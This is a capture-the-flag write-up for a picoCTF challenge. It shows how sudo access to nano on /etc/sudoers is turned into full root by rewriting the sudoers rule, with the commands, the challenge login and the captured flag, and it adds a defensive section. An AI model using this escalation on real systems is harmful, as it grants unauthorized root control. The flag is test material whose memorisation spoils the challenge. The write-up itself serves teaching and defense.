# ✏️ ABSOLUTE NANO

| Field | Details |
|-------|---------|
| **CTF** | picoCTF 2026 |
| **Category** | General Skills |
| **Difficulty** | Medium |
| **Points** | 200 pts |
| **Author** | DARKRAICG492 |
| **Technique** | Sudoers File Editing via Nano → Full Root Privilege Escalation |

---

## 🧩 Challenge Description

> *You have complete power with nano. Think you can get the flag?*

We are given SSH access to a remote machine:

```
ssh -p 56166 ctf-player@crystal-peak.picoctf.net
Password: 46cb0c29
```

A `flag.txt` file exists but is owned by root and unreadable. The twist this time: we have sudo access to `nano` on a very specific file — `/etc/sudoers`. That's the file that **controls all sudo permissions on the system**.

---

### Step 2 — Attempt to Read the Flag

```bash
ctf-player@challenge:~$ ls
flag.txt

ctf-player@challenge:~$ cat flag.txt
cat: flag.txt: Permission denied
```

❌ As expected — the file is root-owned. Check its permissions:

```bash
ctf-player@challenge:~$ ls -la
```

**Output:**
```
-r--r----- 1 root      root       35 Feb  4 22:26 flag.txt
```

The file is readable only by root and the root group. Our user has no access.

---

### Step 3 — Enumerate Sudo Permissions

```bash
ctf-player@challenge:~$ sudo -l
```

**Output:**
```
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
```

> 💡 **Key insight:** We can open `/etc/sudoers` — the file that defines **all sudo rules on the system** — in nano, as root, with no password. This means we can rewrite the rules to grant ourselves unrestricted sudo access.

---

## 💥 Exploitation

### Step 4 — Open `/etc/sudoers` in Nano as Root

```bash
ctf-player@challenge:~$ sudo /bin/nano /etc/sudoers
```

The sudoers file opens in nano. At the bottom, you'll see the current rule:

```
ctf-player ALL=(ALL) NOPASSWD: /bin/nano /etc/sudoers
```

This restricts us to running only `/bin/nano /etc/sudoers` with elevated privileges.

---

### Step 5 — Edit the Sudoers Rule

Navigate to the last line and **replace the restrictive rule** with an unrestricted one:

**Before:**
```
ctf-player ALL=(ALL) NOPASSWD: /bin/nano /etc/sudoers
```

**After (edited):**
```
ctf-player ALL=(ALL:ALL) ALL
```

This grants `ctf-player` the ability to run **any command as any user**, just like root.

**Save and exit nano:**
- Press `Ctrl + O` → `Enter` to write/save the file
- Press `Ctrl + X` to exit nano

> ⚠️ **Important:** `/etc/sudoers` must be syntactically valid or `sudo` will break entirely. The format `ALL=(ALL:ALL) ALL` is standard and safe. Normally you'd edit this with `visudo` which validates syntax — but nano works here since we control the environment.

---

### Step 6 — Read the Flag with Unrestricted Sudo

Now that we've rewritten the sudoers rule, we can run any command as root:

```bash
ctf-player@challenge:~$ sudo cat flag.txt
```

**Output:**
```
picoCTF{n4n0_411_7h3_w4y_17bbc630}
```

---

## 🚩 Flag

```
picoCTF{n4n0_411_7h3_w4y_17bbc630}
```

---

## 📚 Concepts & Further Reading

### What is `/etc/sudoers`?

The `/etc/sudoers` file is the central configuration file that defines **who can run what commands with elevated privileges** on a Linux system. Its syntax follows the pattern:

```
user  host=(run_as_user:run_as_group)  commands
```

| Entry | Meaning |
|-------|---------|
| `ctf-player ALL=(ALL) NOPASSWD: /bin/nano /etc/sudoers` | Only nano on sudoers, no password |
| `ctf-player ALL=(ALL:ALL) ALL` | Any command, any user, any group |
| `root ALL=(ALL:ALL) ALL` | Standard root entry |

### Why Is This So Dangerous?

Giving write access to `/etc/sudoers` — even via a single tool like nano — is equivalent to giving **full root access**. The logic:

```
write /etc/sudoers → rewrite sudo rules → run any command as root → full system compromise
```

This is a real-world privilege escalation pattern. On production systems, `/etc/sudoers` should:
- Only be editable via `visudo` (which validates syntax)
- Never be writable by non-root users in any form

### The Sudoers Escalation Chain

```
sudo nano /etc/sudoers
        ↓
Edit rule: ctf-player ALL=(ALL:ALL) ALL
        ↓
sudo cat flag.txt  (now works — unrestricted sudo)
        ↓
Flag captured
```
---

## 🛡️ Defensive Perspective

- **Never grant sudo access to editors on sensitive files.** Even `nano` with a fixed path argument can escalate to full root if the target file controls permissions itself.
- **`/etc/sudoers` should only be modified via `visudo`** — it locks the file during editing and validates syntax before saving, preventing a broken config that locks out all sudo access.
- Audit `/etc/sudoers` and `/etc/sudoers.d/` regularly. Any entry granting access to a text editor, interpreter, or file manager should be treated as a full root grant.
- Use **`sudo -l`** as an attacker would — to spot dangerous misconfigurations before they're exploited.

---

## 🗺️ Attack Summary

```
SSH into machine
       ↓
cat flag.txt → Permission denied
       ↓
sudo -l → (ALL) NOPASSWD: /bin/nano /etc/sudoers   ← sudoers itself is editable!
       ↓
sudo /bin/nano /etc/sudoers
       ↓
Edit last line:
  FROM: ctf-player ALL=(ALL) NOPASSWD: /bin/nano /etc/sudoers
  TO:   ctf-player ALL=(ALL:ALL) ALL
       ↓
Ctrl+O → Enter → Ctrl+X  (save and exit)
       ↓
sudo cat flag.txt → picoCTF{n4n0_411_7h3_w4y_17bbc630}
```

---

> **Key lesson:** Sudo access to an editor on `/etc/sudoers` is an **immediate full root escalation**. The file that controls privileges is itself the attack surface. Always check not just *what binary* you can run with sudo, but *what file* it operates on.
